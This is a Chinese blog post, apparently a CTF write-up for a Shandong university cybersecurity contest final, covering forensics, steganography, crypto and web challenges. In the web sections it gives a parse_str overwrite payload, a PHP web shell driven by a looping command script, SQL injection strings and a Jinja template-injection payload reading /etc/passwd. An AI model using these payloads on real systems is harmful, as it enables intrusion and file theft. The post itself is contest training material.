<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="第七届山东省大学生网络安全技能大赛决赛Writeup"><meta name="keywords" content="WriteUp,CTF"><meta name="author" content="J0k3r"><meta name="copyright" content="J0k3r"><title>第七届山东省大学生网络安全技能大赛决赛Writeup | J0k3r's Blog</title><link rel="shortcut icon" href="/img/fav.png"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?9e8a6ba1f41c0d7b000fcfd73f1c7929";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-159554347-1', 'auto');
ga('send', 'pageview');</script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#特殊后门"><span class="toc-number">1.</span> <span class="toc-text">特殊后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic"><span class="toc-number">2.</span> <span class="toc-text">weblogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志分析"><span class="toc-number">3.</span> <span class="toc-text">日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#啊哒"><span class="toc-number">4.</span> <span class="toc-text">啊哒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#神秘的文件"><span class="toc-number">5.</span> <span class="toc-text">神秘的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#basic"><span class="toc-number">6.</span> <span class="toc-text">basic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#进制转换"><span class="toc-number">7.</span> <span class="toc-text">进制转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#affine"><span class="toc-number">8.</span> <span class="toc-text">affine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#colors"><span class="toc-number">9.</span> <span class="toc-text">colors</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CrackIt"><span class="toc-number">10.</span> <span class="toc-text">CrackIt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rsa"><span class="toc-number">11.</span> <span class="toc-text">rsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyWeb"><span class="toc-number">12.</span> <span class="toc-text">babyWeb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyWeb2"><span class="toc-number">13.</span> <span class="toc-text">babyWeb2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-flask"><span class="toc-number">14.</span> <span class="toc-text">easy_flask</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">J0k3r</div><div class="author-info__description text-center">求知若饥，虚心若愚</div><div class="follow-button"><a href="https://github.com/zhuxianjin">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">40</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">38</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" href="https://p0sec.net/">p0神</a><a class="author-info-links__name text-center" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" href="http://0sec.com.cn/">everglow</a><a class="author-info-links__name text-center" href="http://mengsec.com/">MengChen</a><a class="author-info-links__name text-center" href="http://windylh.com/">Windylh</a><a class="author-info-links__name text-center" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" href="http://lanvnal.com/">LANVNAL</a><a class="author-info-links__name text-center" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" href="https://daolgts.github.io/">daolgts</a><a class="author-info-links__name text-center" href="https://qingchenldl.github.io">V0W</a><a class="author-info-links__name text-center" href="https://fancyking.ml/">fancyking</a><a class="author-info-links__name text-center" href="http://asa9ao.xyz/">Asa9ao</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/wallhaven-j5k275.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">J0k3r's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">归档</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/links/">友链</a><a class="site-page" href="/about/">关于我</a></span></div><div id="post-info"><div id="post-title">第七届山东省大学生网络安全技能大赛决赛Writeup</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-11-06</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>点击阅读</p>
<a id="more"></a>
<p>感觉难度不是特别大，不过自己太菜了，很多分不该失</p>
<h3 id="特殊后门"><a href="#特殊后门" class="headerlink" title="特殊后门"></a>特殊后门</h3><blockquote>
<p>从通信方式的角度看，后门可分为http/https型、irc型、dns型、icmp型等等。安全人员抓到一份可疑的流量包，请从中分析出利用某种特殊协议传输的数据。</p>
</blockquote>
<p>这里是通过icmp,直接过滤出来</p>
<p>第一个icmp就给了提示</p>
<p><img src="https://i.loli.net/2018/11/05/5be04ba7a37e4.png" alt="https://i.loli.net/2018/11/05/5be04ba7a37e4.png"></p>
<p>接着每个icmp包里都有一个flag字符，拼起来即可</p>
<p><code>flag{Icmp_backdoor_can_transfer_some_information}</code></p>
<h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><p>首先在分组详情中搜索hostname字符串，接着追踪tcp流，在tcp流中再次查找hostname字符串</p>
<p><img src="https://i.loli.net/2018/11/05/5be051b6c7997.png" alt="https://i.loli.net/2018/11/05/5be051b6c7997.png"></p>
<p>16进制很明显了</p>
<p><code>flag{6ad4c5a09043}</code></p>
<h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><p>有点长，比赛时手撕的。。</p>
<p>赛后了，就写个脚本吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">'log.txt'</span>,<span class="string">'wb'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_and_write</span><span class="params">(a)</span>:</span></span><br><span class="line">    tmp = urllib.unquote(a)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'200'</span> <span class="keyword">and</span> <span class="string">'flag_is_here'</span> <span class="keyword">and</span> <span class="string">'RCKM'</span> <span class="keyword">in</span> tmp <span class="keyword">and</span> <span class="string">'404'</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp:</span><br><span class="line">        file.write(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'access.log'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> el <span class="keyword">in</span> f.readlines():</span><br><span class="line">        decode_and_write(el)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'log.txt'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> ff:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    char = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> el <span class="keyword">in</span> ff.readlines():</span><br><span class="line">        num1 = re.findall(<span class="string">r'AND ORD\(MID\(\(SELECT IFNULL\(CAST\(flag AS CHAR\),0x20\) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1\),(.*?),1\)\)&gt;.*?'</span>,el)</span><br><span class="line">        num2 = re.findall(<span class="string">r'AND ORD\(MID\(\(SELECT IFNULL\(CAST\(flag AS CHAR\),0x20\) FROM dvwa.flag_is_here ORDER BY flag LIMIT 0,1\),.*?,1\)\)&gt;(.*?) AND'</span>,el)</span><br><span class="line">        <span class="keyword">if</span> num1[<span class="number">0</span>] == str(i):</span><br><span class="line">            char = chr(int(str(num2[<span class="number">0</span>])))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += chr(ord(char)+<span class="number">1</span>)</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num1[<span class="number">0</span>] == str(i):</span><br><span class="line">                char = chr(int(str(num2[<span class="number">0</span>])))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"></span><br><span class="line">ff.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/11/05/5be062d00b570.png" alt="https://i.loli.net/2018/11/05/5be062d00b570.png"></p>
<p>少个}</p>
<h3 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h3><p>foremost分离出图片内的压缩包</p>
<p>压缩包密码在图片详细信息中</p>
<p><code>flag{3XiF_iNf0rM@ti0n}</code></p>
<h3 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h3><p>zip明文攻击</p>
<p><img src="https://i.loli.net/2018/11/06/5be15cc551ed6.png" alt="https://i.loli.net/2018/11/06/5be15cc551ed6.png"></p>
<p>将得到的docx改为.zip,解压，docProps文件夹内有flag.txt</p>
<p>base64解码就好</p>
<p><code>flag{d0cX_1s_ziP_file}</code></p>
<h3 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h3><p><img src="https://i.loli.net/2018/11/05/5bdffe4075b7c.png" alt="https://i.loli.net/2018/11/05/5bdffe4075b7c.png"></p>
<p>明显RGB画图了，就是135000开不了平方，测试150x900是最好的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">pic = Image.new(<span class="string">"RGB"</span>,(<span class="number">150</span>, <span class="number">900</span>))</span><br><span class="line">fo = open(<span class="string">"basic.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">pics = []</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">135000</span>: </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    a = fo.readline()</span><br><span class="line">    pics.append(a)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">str = <span class="string">""</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">900</span>):</span><br><span class="line">        s = pics[i].split(<span class="string">','</span>)</span><br><span class="line">        pic.putpixel([y,x],(int(s[<span class="number">0</span>]), int(s[<span class="number">1</span>]), int(s[<span class="number">2</span>])))</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">"flagg.png"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/11/05/5bdffdbd428f7.png" alt="https://i.loli.net/2018/11/05/5bdffdbd428f7.png"></p>
<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><p>得到如下文本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e</span><br></pre></td></tr></table></figure>
<p>python转换进制即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">file = open(<span class="string">"text.txt"</span>,<span class="string">'r'</span>)</span><br><span class="line">jin = file.read().split(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> jin:</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'d'</span>:</span><br><span class="line">        tmp = chr(int(str(i)[<span class="number">1</span>:]))</span><br><span class="line">        data += tmp</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'x'</span>:</span><br><span class="line">        data += chr(int(str(i)[<span class="number">1</span>:],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'b'</span>:</span><br><span class="line">        data += chr(int(str(i)[<span class="number">1</span>:],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">if</span> str(i)[:<span class="number">1</span>] == <span class="string">'o'</span>:</span><br><span class="line">        data += chr(int(str(i)[<span class="number">1</span>:],<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> data</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/11/05/5bdfffaa02e7a.png" alt="https://i.loli.net/2018/11/05/5bdfffaa02e7a.png"></p>
<h3 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h3><p>即仿射加密</p>
<p>拿出珍藏的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">affine</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    pwd_dic = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">        pwd_dic[chr(((a * i + b) % <span class="number">26</span> + <span class="number">97</span>))] = chr(i + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">return</span> pwd_dic</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pwd_dic = &#123;&#125;</span><br><span class="line">    pwd = raw_input(<span class="string">'str: '</span>)</span><br><span class="line">    a = input(<span class="string">'input a (c = (am + b) mod 26) : '</span>)</span><br><span class="line">    b = input(<span class="string">'input b (c = (am + b) mod 26) : '</span>)</span><br><span class="line">    plain = []</span><br><span class="line">    pwd_dic = affine(a, b)</span><br><span class="line">    print(pwd_dic)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">        plain.append(pwd_dic[i])</span><br><span class="line">    print(<span class="string">"flag is :"</span> + <span class="string">""</span>.join(plain))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/11/05/5be048c2c2480.png" alt="https://i.loli.net/2018/11/05/5be048c2c2480.png"></p>
<h3 id="colors"><a href="#colors" class="headerlink" title="colors"></a>colors</h3><p>得到七张图片，stegsolve得到</p>
<p><img src="https://i.loli.net/2018/11/06/5be1011b9148e.png" alt="https://i.loli.net/2018/11/06/5be1011b9148e.png"></p>
<p>更改每张图片高度，都能得到一串小格，应该是二进制了</p>
<p><img src="https://i.loli.net/2018/11/06/5be1015d2437b.png" alt="https://i.loli.net/2018/11/06/5be1015d2437b.png"></p>
<p>比赛时一直横着读的，没想到是竖着读，一个ASCII虽然8位，但最高位是0，这又有七张图片，所以还是太菜了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="string">'11111111010111101111'</span></span><br><span class="line">c2 = <span class="string">'11111011111110111111'</span></span><br><span class="line">c3 = <span class="string">'00001100101010110001'</span></span><br><span class="line">c4 = <span class="string">'01001010010000001101'</span></span><br><span class="line">c5 = <span class="string">'11010011011101010111'</span></span><br><span class="line">c6 = <span class="string">'10011011011010110110'</span></span><br><span class="line">c7 = <span class="string">'00111001101101111101'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    c = c1[i]+c2[i]+c3[i]+c4[i]+c5[i]+c6[i]+c7[i]</span><br><span class="line">    flag += chr(int(c,<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p><code>flag{Png1n7erEs7iof}</code></p>
<h3 id="CrackIt"><a href="#CrackIt" class="headerlink" title="CrackIt"></a>CrackIt</h3><p>一个shadow文件，含加密的root密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$HRMJoyGA$26FIgg6CU0bGUOfqFB0Qo9AE2LRZxG8N3H.3BK8t49wGlYbkFbxVFtGOZqVIq3qQ6k0oetDbn2aVzdhuVQ6US.:17770:0:99999:7:::</span><br></pre></td></tr></table></figure>
<p>幸亏有工具john</p>
<p><img src="https://i.loli.net/2018/11/06/5be0fce37903c.png" alt="https://i.loli.net/2018/11/06/5be0fce37903c.png"></p>
<h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="line">e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><span class="line"></span><br><span class="line">enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span><br></pre></td></tr></table></figure>
<p>工具一把梭</p>
<p><img src="https://i.loli.net/2018/11/05/5be04829b8f27.png" alt="https://i.loli.net/2018/11/05/5be04829b8f27.png"></p>
<h3 id="babyWeb"><a href="#babyWeb" class="headerlink" title="babyWeb"></a>babyWeb</h3><p>加XFF头和更改cookie的admin</p>
<p><img src="https://i.loli.net/2018/11/05/5be0469b3c44a.png" alt="https://i.loli.net/2018/11/05/5be0469b3c44a.png"></p>
<h3 id="babyWeb2"><a href="#babyWeb2" class="headerlink" title="babyWeb2"></a>babyWeb2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'here.php'</span>;</span><br><span class="line">    $key = <span class="string">'kelaibei'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">        @parse_str($id);</span><br><span class="line">        <span class="keyword">if</span> ($key[<span class="number">99</span>] != <span class="string">'aabg7XSs'</span> &amp;&amp; md5($key[<span class="number">99</span>]) == md5(<span class="string">'aabg7XSs'</span>)) &#123;</span><br><span class="line">           <span class="keyword">echo</span> $hint;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'try again'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>利用parse_str变量覆盖，paylaod:<code>?id=key[99]=QNKCDZO</code></p>
<p>得到upl04d50m3thing.php</p>
<p><img src="https://i.loli.net/2018/11/05/5be0439d8caab.png" alt="https://i.loli.net/2018/11/05/5be0439d8caab.png"></p>
<p>写入一句话,提交得到php文件链接，访问发现内容被更改，输出<code>Too slow!</code></p>
<p>利用条件竞争，先用burp的intruder开多线程访问</p>
<p><img src="https://i.loli.net/2018/11/05/5be044231e4b6.png" alt="https://i.loli.net/2018/11/05/5be044231e4b6.png"></p>
<p>再利用脚本或其他方式尝试getshell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u = <span class="string">'http://47.105.148.65:29002/uploads/8af92ffefda7050707590b352dfb3cd2e03d29a6/s.php'</span></span><br><span class="line">passwd = <span class="string">'s'</span></span><br><span class="line">com = <span class="string">'ls -a'</span></span><br><span class="line">payload = &#123;passwd:<span class="string">'system(\''</span>+com+<span class="string">'\');'</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = s.post(u,payload)</span><br><span class="line">        print(<span class="string">"[+] success\n"</span>+res.text+<span class="string">"==="</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"failed"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2018/11/05/5be044d1f3d51.png" alt="https://i.loli.net/2018/11/05/5be044d1f3d51.png"></p>
<h3 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h3><p>Search Comments:处存在sql注入</p>
<p><code>&#39; order by 4#</code> 出现错误</p>
<p><img src="https://i.loli.net/2018/11/06/5be104a33ad56.png" alt="https://i.loli.net/2018/11/06/5be104a33ad56.png"></p>
<p><code>http://47.105.148.65:29003/?username=&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;ctf&#39; and table_name=&#39;comment&#39;),3%23</code></p>
<p>得到id,username,comment</p>
<p>但是只能在第三个字段查询，且<code>&#39; union select 1,2,comment from comment%23</code>会出现和<code>&#39; or 1=1%23</code>一样的<code>Rendering Error.</code></p>
<p>出现了模版渲染错误</p>
<p>直接<code>&#39; union select 1,2,10%23</code>测试报 Mysql Error.错误，应该是花括号原因，不过mysql支持0x开头的16进制，以16进制传入即可</p>
<p><img src="https://i.loli.net/2018/11/06/5be10acb1615d.png" alt="https://i.loli.net/2018/11/06/5be10acb1615d.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__[0].__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>能够正常读取</p>
<p><img src="https://i.loli.net/2018/11/06/5be10d604faf8.png" alt="https://i.loli.net/2018/11/06/5be10d604faf8.png"></p>
<p>尝试查看flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; ().__class__.__bases__[0].__subclasses__()[40](&quot;/flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><code>flag{c15f43da-481e-4131-84b2-e315719b989b}</code></p>
